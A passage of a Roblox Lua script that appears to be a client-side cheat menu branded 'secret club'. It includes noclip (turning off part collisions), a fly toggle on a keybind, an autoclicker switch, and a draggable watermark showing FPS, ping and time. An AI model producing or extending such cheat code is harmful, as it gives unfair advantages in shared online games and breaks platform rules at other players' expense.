            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end
end)

LocalPlayer.CharacterAdded:Connect(function(char)
    flyEnabled = false
    if bv then bv:Destroy(); bv = nil end
    if bg then bg:Destroy(); bg = nil end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    local inTextBox = UserInputService:GetFocusedTextBox() ~= nil
    
    if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.Delete then
        MainFrame.Visible = not MainFrame.Visible
    end
    
    if input.KeyCode == flyKeybind and not inTextBox and not waitingForFlyKey then
        flyEnabled = not flyEnabled
        toggleFlyState(flyEnabled)
        if flyToggleButton then
            local switch = flyToggleButton:FindFirstChildOfClass("TextButton")
            if switch then
                TweenService:Create(switch, TweenInfo.new(0.15), {
                    BackgroundColor3 = flyEnabled and Color3.fromRGB(60, 140, 220) or Color3.fromRGB(50, 50, 50)
                }):Play()
            end
        end
    end
    
    if input.KeyCode == Enum.KeyCode.K and not inTextBox then
        _G.AutoClicker = not _G.AutoClicker
    end
end)

-- ========================================
-- WATERMARK (опционально)
-- ========================================
local wmFrame, wmGlow, wmLabel, wmStroke
do
task.spawn(function()
    task.wait(1)
    
    local WMHeader = createSectionHeader("Watermark")
    WMHeader.Parent = PlayersRight
    
    local fpsQueue = {}
    local fpsMax = 10
    local wmLastUpdate = 0
    local wmEnabled = false
    
    local function avgFPS(fps)
        table.insert(fpsQueue, fps)
        if #fpsQueue > fpsMax then table.remove(fpsQueue, 1) end
        local sum = 0
        for i = 1, #fpsQueue do sum = sum + fpsQueue[i] end
        return math.round(sum / #fpsQueue)
    end
    
    local function formatTime() return os.date("%H:%M") end
    
    local function pingCol(p)
        if p < 60 then return "#5cdc5c"
        elseif p < 120 then return "#e0d44a"
        else return "#e05050" end
    end
    
    local wmGui = Instance.new("ScreenGui")
    wmGui.Name = "SecretClubWatermark"
    wmGui.ResetOnSpawn = false
    wmGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    wmGui.Parent = PlayerGui
    
    wmGlow = Instance.new("Frame")
    wmGlow.Name = "Glow"
    wmGlow.Size = UDim2.new(0, 240, 0, 32)
    wmGlow.Position = UDim2.new(1, -250, 0, -6)
    wmGlow.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
    wmGlow.BackgroundTransparency = 0.85
    wmGlow.ZIndex = 999
    wmGlow.Visible = false
    wmGlow.Parent = wmGui
    
    local glowCorner = Instance.new("UICorner")
    glowCorner.CornerRadius = UDim.new(0, 8)
    glowCorner.Parent = wmGlow
    
    wmFrame = Instance.new("Frame")
    wmFrame.Name = "WMFrame"
    wmFrame.Size = UDim2.new(0, 230, 0, 24)
    wmFrame.Position = UDim2.new(1, -245, 0, -2)
    wmFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
    wmFrame.BackgroundTransparency = 0.2
    wmFrame.ZIndex = 1000
    wmFrame.Visible = false
    wmFrame.Parent = wmGui
    
    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 6)
    frameCorner.Parent = wmFrame
    
    wmStroke = Instance.new("UIStroke")
    wmStroke.Color = Color3.fromRGB(60, 110, 180)
    wmStroke.Thickness = 1
    wmStroke.Transparency = 0.5
    wmStroke.Parent = wmFrame
    
    wmLabel = Instance.new("TextLabel")
    wmLabel.Size = UDim2.new(1, -12, 1, 0)
    wmLabel.Position = UDim2.new(0, 6, 0, 0)
    wmLabel.BackgroundTransparency = 1
    wmLabel.Font = Enum.Font.GothamMedium
    wmLabel.TextSize = 11
    wmLabel.TextColor3 = Color3.fromRGB(210, 220, 230)
    wmLabel.TextStrokeTransparency = 0.85
    wmLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    wmLabel.TextScaled = false
    wmLabel.TextXAlignment = Enum.TextXAlignment.Left
    wmLabel.RichText = true
    wmLabel.Text = '<font color="#88d4ff">secret club</font>'
    wmLabel.ZIndex = 1001
    wmLabel.Parent = wmFrame
    
    createToggle(PlayersRight, "Show Watermark", false, function(enabled)
        wmEnabled = enabled
        wmFrame.Visible = enabled
        wmGlow.Visible = enabled
        
        if enabled then
            wmFrame.Position = UDim2.new(1, 50, 0, -2)
            wmGlow.Position = UDim2.new(1, 55, 0, -6)
            
            local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            TweenService:Create(wmFrame, info, {Position = UDim2.new(1, -245, 0, -2)}):Play()
            TweenService:Create(wmGlow, info, {Position = UDim2.new(1, -250, 0, -6)}):Play()
        end
    end)
    
    local isDragging = false
    local dragOffset = Vector2.new(0, 0)
    
    wmFrame.InputBegan:Connect(function(input, consumed)
        if consumed then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = true
            local mouse = UserInputService:GetMouseLocation()
            dragOffset = Vector2.new(mouse.X - wmFrame.AbsolutePosition.X, mouse.Y - wmFrame.AbsolutePosition.Y)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then isDragging = false end
    end)
    
    RunService.RenderStepped:Connect(function(dt)
        if not wmEnabled then return end
        
        if isDragging then
            local mouse = UserInputService:GetMouseLocation()
            local screen = workspace.CurrentCamera.ViewportSize
            local x = math.clamp(mouse.X - dragOffset.X, 0, screen.X - wmFrame.AbsoluteSize.X)
            local y = math.clamp(mouse.Y - dragOffset.Y, -50, screen.Y - wmFrame.AbsoluteSize.Y)
            wmFrame.Position = UDim2.new(0, x, 0, y)
            wmGlow.Position = UDim2.new(0, x - 5, 0, y - 4)
        end
        
        local now = tick()
        if now - wmLastUpdate < 0.5 then return end
        wmLastUpdate = now
        
        local fps = avgFPS(math.round(1 / dt))
        local ping = math.round(LocalPlayer:GetNetworkPing() * 2000)
        
        local txt = string.format(
            '<font color="#88d4ff">secret club</font> <font color="#3a4a60">|</font> <font color="#C8D2DC">%d fps</font> <font color="#3a4a60">|</font> <font color="#909090">ping: </font><font color="%s">%dms</font> <font color="#3a4a60">|</font> <font color="#7aa8c8">%s</font>',
            fps, pingCol(ping), ping, formatTime()
        )
        
        wmLabel.Text = txt
        
        local TextService = game:GetService("TextService")
        local plainText = txt:gsub("<[^>]+>", "")
        local textBounds = TextService:GetTextSize(plainText, wmLabel.TextSize, wmLabel.Font, Vector2.new(1000, 24))
        
        local w = math.ceil(textBounds.X + 16)
        wmFrame.Size = UDim2.new(0, w, 0, 24)
        wmGlow.Size = UDim2.new(0, w + 10, 0, 32)
        
        if not isDragging then
            wmGlow.Position = UDim2.new(0, wmFrame.Position.X.Offset - 5, 0, wmFrame.Position.Y.Offset - 4)
        end
    end)
    
    local oldApplyTheme = ApplyTheme
    ApplyTheme = function(theme)
        oldApplyTheme(theme)
        if wmFrame then TweenService:Create(wmFrame, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgMedium}):Play() end
        if wmStroke then TweenService:Create(wmStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play() end
        if wmGlow then TweenService:Create(wmGlow, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play() end
    end
    
    print("[Watermark] ✓ Loaded in top-right corner!")
end)
end